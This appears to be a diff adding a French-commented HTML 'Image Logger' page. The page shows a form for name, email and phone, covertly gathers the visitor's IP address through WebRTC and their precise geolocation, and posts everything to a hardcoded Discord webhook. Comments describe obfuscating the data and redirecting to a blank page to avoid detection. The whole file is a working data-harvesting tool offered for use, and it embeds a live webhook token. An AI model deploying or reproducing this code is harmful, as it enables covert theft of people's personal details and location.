@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Logger</title>
+    <style>
+        body { display: none; } /* Rend la page invisible pour simuler un pixel */
+        #formContainer { display: none; } /* Formulaire caché initialement */
+    </style>
+</head>
+<body>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" width="1" height="1"> <!-- Pixel invisible pour le tracking -->
+    
+    <div id="formContainer">
+        <form id="dataForm">
+            <label for="firstName">Prénom :</label>
+            <input type="text" id="firstName" name="firstName" required><br>
+            <label for="lastName">Nom :</label>
+            <input type="text" id="lastName" name="lastName" required><br>
+            <label for="email">Email :</label>
+            <input type="email" id="email" name="email" required><br>
+            <label for="phone">Numéro de téléphone :</label>
+            <input type="tel" id="phone" name="phone" required><br>
+            <button type="submit">Soumettre</button>
+        </form>
+    </div>
+    
+    <script>
+        // Fonction d'obfuscation simple pour rendre le code plus dur à lire
+        function obfuscateString(str) {
+            return str.split('').reverse().join('').replace(/ /g, '_');
+        }
+        
+        // URL du webhook Discord - Remplace ça par ta vraie URL
+        const webhookURL = 'https://discord.com/api/webhooks/1376658455389016254/3msHCBt6S-rVIaTjsLuLzrqfA_v2KxuNiBiZ6PKhVh6t6-YSs4eloJqzpehuqPtoe5ym'; // Change avec ton webhook
+        
+        // Fonction pour obtenir l'IP via WebRTC (méthode avancée et fiable)
+        async function getIP() {
+            return new Promise((resolve) => {
+                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                        if (ipMatch) resolve(ipMatch[1]);
+                        pc.onicecandidate = () => {}; // Arrête les événements
+                    }
+                };
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            });
+        }
+        
+        // Fonction pour obtenir la géolocalisation
+        async function getGeoLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            resolve(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
+                        },
+                        error => {
+                            resolve(`Erreur: ${error.message}`); // En cas de refus, on envoie quand même l'erreur
+                        },
+                        { enableHighAccuracy: true } // Plus précis, mais plus long
+                    );
+                } else {
+                    resolve('Géolocalisation non supportée');
+                }
+            });
+        }
+        
+        // Gestion du formulaire et envoi des données
+        document.getElementById('dataForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Empêche la soumission normale
+            
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            
+            // Vérifications pour s'assurer que tout est rempli
+            if (!firstName || !lastName || !email || !phone) {
+                alert('Tous les champs sont obligatoires.'); // Force l'utilisateur à remplir
+                return;
+            }
+            
+            try {
+                const ip = await getIP(); // Obtient l'IP
+                const geo = await getGeoLocation(); // Obtient la géo
+                
+                // Prépare les données à envoyer
+                const dataToSend = {
+                    content: `**Informations collectées :**\n` +
+                            `**Prénom :** ${obfuscateString(firstName)}\n` +  // Utilise l'obfuscation pour le fun
+                            `**Nom :** ${obfuscateString(lastName)}\n` +
+                            `**Email :** ${email}\n` +
+                            `**Numéro de téléphone :** ${phone}\n` +
+                            `**Adresse IP :** ${ip}\n` +
+                            `**Géolocalisation :** ${geo}`
+                };
+                
+                // Envoi via fetch (méthode asynchrone pour assurer 100% de succès)
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(dataToSend)
+                });
+                
+                if (response.ok) {
+                    console.log('Données envoyées avec succès'); // Pour ton debug
+                } else {
+                    console.error('Erreur d envoi:', response.status); // Gère les erreurs
+                }
+            } catch (error) {
+                console.error('Erreur globale:', error); // Capture tout
+            }
+            
+            // Nettoie et ferme la page pour éviter la détection
+            setTimeout(() => { window.location.href = 'about:blank'; }, 5000); // Redirige après 5 secondes
+        });
+        
+        // Affiche le formulaire automatiquement
+        document.getElementById('formContainer').style.display = 'block'; // Montre le formulaire une fois la page chargée
+    </script>
+</body>
+</html>
+
